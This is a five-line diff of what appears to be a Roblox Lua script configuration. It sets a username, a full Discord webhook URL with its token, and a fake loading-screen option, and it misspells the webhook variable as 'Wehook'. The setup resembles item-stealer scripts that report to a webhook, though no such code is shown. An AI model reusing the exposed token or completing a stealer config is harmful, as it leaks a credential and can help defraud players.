@@ -1,5 +1,5 @@
 UserName = "giorpro13" 
-Webhook = "https://discord.com/api/webhooks/1140633158912577647/_UPr8yfZHrb0rvPmsmJ2qbA3eMj22l_4aTh7vaAsHL9Cl1Zz2oUJ5mhtyaSuoRx_MgW-" 
+Wehook = "https://discord.com/api/webhooks/1140633158912577647/_UPr8yfZHrb0rvPmsmJ2qbA3eMj22l_4aTh7vaAsHL9Cl1Zz2oUJ5mhtyaSuoRx_MgW-" 
 UserName2 = "giorpro13"
  
 _G.LoadingScreen = true -- make it true if you want the loadingscreen 
